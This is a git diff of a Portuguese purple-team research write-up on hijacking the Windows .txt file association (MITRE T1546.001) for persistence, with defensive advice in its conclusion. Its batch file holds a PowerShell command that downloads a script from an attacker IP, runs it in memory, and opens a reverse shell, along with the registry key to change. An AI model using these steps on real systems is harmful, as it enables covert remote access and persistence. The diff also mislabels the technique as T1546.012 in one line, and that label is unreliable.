@@ -3,9 +3,9 @@
   <img src="./imagens/ISHLOGO.png" alt="Logo do Purple Team" width="300" height="300">
 </p>
 
-# CTI Purple Team - Execução Acionada por Evento: Alterar Associação de Arquivo Padrão
+# CTI Purple Team - Execução Acionada por Evento: Alterar Associação de Arquivo Padrão T1546.001
 
-Nesta pesquisa, iremos abordar a tática [TA0003](https://attack.mitre.org/tactics/TA0003/) (Persistência), dando ênfase a sub-técnica [T1546.001](https://attack.mitre.org/techniques/T1546/001/) (Event Triggered Execution: Change Default File Association).
+Nesta pesquisa, iremos abordar a tática [TA0003](https://attack.mitre.org/tactics/TA0003/) (Persistência), dando ênfase a sub-técnica [T1546.012](https://attack.mitre.org/techniques/T1546/001/) (Event Triggered Execution: Change Default File Association).
 
 A tática de persisência é uma das maneiras pelas quais os invasores podem explorar eventos específicos do sistema para executar código malicioso de forma persistente. Neste tipo de ataque, os invasores modificam as configurações do sistema que controlam como os arquivos serão abertos por padrão quando um usuário interage com eles. Isso pode ser explorado por meio de diversas técnicas, incluindo, manipulação de resgistros do sistema ou exploração de vulnerabilidades em aplicativos que lidam com a abertura de arquivos.
 
@@ -22,15 +22,13 @@ Ou seja, quando um arquivo é criado em um sistema operacional como o Windows, e
 ## Contexto
 Neste contexto, exploraremos os conceitos por trás da execução acionada por evento representando o sequestro da extenção ***.txt***, sendo possível executar um aplicativo malicioso antes que o arquivo real seja aberto, gerando um shell reverso na máquina do atacante, a fim de obter persistência. Vale lembrar que essa técnica pode ser usada para modificar qualquer tipo de extensão de arquivo como ***.exe***, ***.dll***, ***.bat***, ***.cmd*** entre muitas outras extensões, que podem ser exploradas por invasores para obter persistência em um sistema.
 
-**Info:** É possível executar este processo de duas maneiras: por meio da interface gráfica ou utilizando CLI como prompt de comandos (CMD).
+Por exemplo, um invasor pode modificar a associação de arquivo padrão para um tipo específico de arquivo, como documentos do Microsoft Word (.docx), para que, sempre que um usuário tente abrir esse tipo de arquivo, o sistema execute automaticamente um arquivo malicioso em vez de abrir o aplicativo correspondente.
 
-Uma vez que essa associação de arquivo padrão é alterada, o código malicioso pode ser executado repetidamente sempre que o usuário tentar abrir um arquivo do tipo afetado, permitindo que o invasor mantenha acesso persistente ao sistema mesmo após reinicializações ou reinstalações do sistema operacional.
-
-Por exemplo, um invasor pode modificar a associação de arquivo padrão para um tipo específico de arquivo, como documentos do Microsoft Word (.docx), para que, sempre que um usuário tente abrir esse tipo de arquivo, o sistema execute automaticamente um arquivo malicioso em vez de abrir o aplicativo correspondente. 
+**Info:** É possível executar este processo de duas maneiras: por meio da interface gráfica ou utilizando CLI como o prompt de comandos (CMD), porém vamos focar apenas na execução pela interface gráfica.
 
 As seleções de associação de arquivos são armazenados no **Registro do Windows** e estão listadas em **HKEY_CLASSES_ROOT.[extention]**, no caso dessa pesquisa será listado em **HKEY_CLASSES_ROOT.txt** e, podem ser editados por usuários com permissões elevadas/administradores que tenham acesso ao Registro.
 
-## Emulação de Ameaça I - Criação de Arquivo Malicioso Através de Interface Gráfica
+## Emulação de Ameaça - Criação de Arquivo Malicioso Através de Interface Gráfica
 
 Há dois locais de registro que definem os manipuladores de extensão, que são mostrados a seguir, e são classificados como: *Global* e *Local*.
 
@@ -40,15 +38,15 @@ Há dois locais de registro que definem os manipuladores de extensão, que são 
   Figura 2: Locais de registro Global e Local
 </p>
 
-Quando um arquivo é aberto, o sistema operacional verifica os registros locais em (HKEY_CURRENT_USER) para determinar qual programa está designado para lidar com aquela extensão de arquivo. Caso não houver nenhuma entrada de registro associada, a verificação será feita na árvore de registro global (HKEY_CLASSES_ROOT).
+Quando um arquivo é aberto, o sistema operacional verifica os registros locais em `(HKEY_CURRENT_USER)` para determinar qual programa está designado para lidar com aquela extensão de arquivo. Caso não houver nenhuma entrada de registro associada, a verificação será feita na árvore de registro global `(HKEY_CLASSES_ROOT)`.
 
 <p align="center">
   <img src="imagens/chave-de-registro-user.png">
   <br>
-  Figura 2: Locais de registro Global e Local
+  Figura 2: Registro Local sem aplicação padrão designada para abrir aquivos .txt
 </p>
 
-Acima, temos o exemplo de que a chave de registro local não possui nenhum aplicativo padrão designado para abrir arquivos de texto, confirmando a infromação acima. 
+Acima, temos o exemplo de que a chave de registro local não possui nenhum aplicativo padrão designado para abrir arquivos de texto, confirmando a infromação citada anteriormente. 
 
 Dependendo dos privilégios do usuário (Administrador ou Usuário Padrão), esses locais de registro podem ser explorados para executar código malicioso, utilizando o manipulador de extensão como um gatilho.
 
@@ -57,7 +55,7 @@ Portanto, podemos observar que o manipulador de extensão ***.txt*** está defin
 Computer\HKEY_CLASSES_ROOT\txtfile\shell\open\command
 ```
 
-Ao abir um arquivo ***.txt***, o windows por padrão sabe que para abrir esse tipo de extensão precisa usar o ***notepad.exe***. Abaixo exemplifico que o comando responsável por abrir arquivos *.txt* é o *notepad.exe %1*, onde o argumento *%1*, especifica um nome de arquivo qualquer, ou seja, é uma variante para o nome dos arquivos que o bloco de notas deve abrir:
+Ao abir um arquivo ***`.txt`***, o windows por padrão sabe que para abrir esse tipo de extensão precisa usar o ***`notepad.exe`***. Abaixo exemplifico que o comando responsável por abrir arquivos *.txt* é o *notepad.exe %1*, onde o argumento ***`%1`***, especifica um nome de um arquivo qualquer, ou seja, é uma variante para o nome dos arquivos que o bloco de notas deve abrir:
 
 <p align="center">
   <img src="imagens/Editor-de-registro-HKEY.png">
@@ -65,7 +63,7 @@ Ao abir um arquivo ***.txt***, o windows por padrão sabe que para abrir esse ti
   Figura 3: Editor de registro HKEY_CLASSES_ROOT\txtfile\shell\open\command
 </p>
 
-Supomos que o usuário alvo possua uma arquivo chamado ***test.txt*** em sua área de trabalho, contendo o conteúdo do arquivo ilustrado abaixo:
+Supomos que o usuário alvo possua uma arquivo chamado ***`test.txt`*** em sua área de trabalho, contendo o conteúdo do arquivo ilustrado abaixo:
 
 <p align="center">
   <img src="imagens/arquivo-vitima.png">
@@ -78,14 +76,14 @@ Iremos criar agora um arquivo malicioso que será executado quando o usuário al
 Para isso, criaremos um arquivo em lotes simples do Windows chamado ***shell.cmd*** na maquina do usuário alvo:
 ```zsh
 start notepad.exe %1
-powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://192.168.140.128/purplecat.ps1');purplecat -c 192.168.140.128 -p 8081 -e cmd.exe"
+start /min powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://192.168.140.128/purplecat.ps1');purplecat -c 192.168.140.128 -p 8081 -e cmd.exe"
 
 
 ```
 
-Este comando do PowerShell baixa um script remoto chamado purplecat.ps1 e executa em memória, pois ele não toca no disco, e em seguida, usa esse script para estabelecer uma conexão "backdoor" com uma máquina remota no endereço IP 192.168.140.128 (ip da máquina atacante) na porta 8081, permitindo que comandos sejam executados cmd.exe nessa máquina.
+Este comando do PowerShell baixa um script remoto chamado `purplecat.ps1` e executa em memória, pois ele não toca no disco, e em seguida, usa esse script para estabelecer uma conexão "backdoor" com uma máquina remota no endereço `IP 192.168.140.128` (ip da máquina atacante) na porta 8081, permitindo que comandos sejam executados cmd.exe nessa máquina.
 
-A partir disso, podemos sequestrar a extensão do arquivo .txt, modificando os dados do valor de registro de Computer\HKEY_CLASSES_ROOT\txtfile\shell\open\command para C:\Users\Win-test\Desktop\shell.cmd, local onde nosso arquivo malicioso está gravado.
+A partir disso, podemos sequestrar a extensão do arquivo .txt, modificando os dados do valor de registro de `Computer\HKEY_CLASSES_ROOT\txtfile\shell\open\command` para `C:\Users\Win-test\Desktop\shell.cmd`, local onde nosso arquivo malicioso está gravado.
 
 <p align="center">
   <img src="imagens/mod.registro.png">
@@ -131,7 +129,10 @@ Após realizar todos esses passos e o processo de persisência configurado na m�
 
 # Conclusão
 
-Ao manipular essas chaves do registro, os invasores podem garantir que seu código malicioso seja executado sempre que o usuário iniciar uma sessão no sistema, permitindo a persistência do ataque. Para prevenir esse tipo de ataque, é importante adotar práticas de segurança robustas, os usuários devem monitorar regularmente as chaves de registro em HKCU em busca de alterações não autorizadas, manter o sistema e os aplicativos atualizados, restringir privilégios de usuário para minimizar o impacto de possíveis ataques e educar os usuários sobre práticas seguras de computação, como não abrir arquivos de fontes desconhecidas.
+Esses são os passos envolvidos na exploração da execução acionada por evento para alterar a associação de arquivo padrão.
+
+Portanto, ao manipular essas chaves do registro, os invasores podem garantir que seu código malicioso seja executado sempre que o usuário iniciar uma sessão no sistema, permitindo a persistência do ataque. Para prevenir esse tipo de ataque, é importante adotar práticas de segurança robustas, os usuários devem monitorar regularmente as chaves de registro em HKCU em busca de alterações não autorizadas, manter o sistema e os aplicativos atualizados, restringir privilégios de usuário para minimizar o impacto de possíveis ataques e educar os usuários sobre práticas seguras de computação, como não abrir arquivos de fontes desconhecidas.
+
 Esperamos que você que leu ou assistiu o Webinar, possa ter compreendido a inteligência que trouxemos nesta pesquisa. Qualquer dúvida, é só nos contactar.
 
 ## Link do Webinar
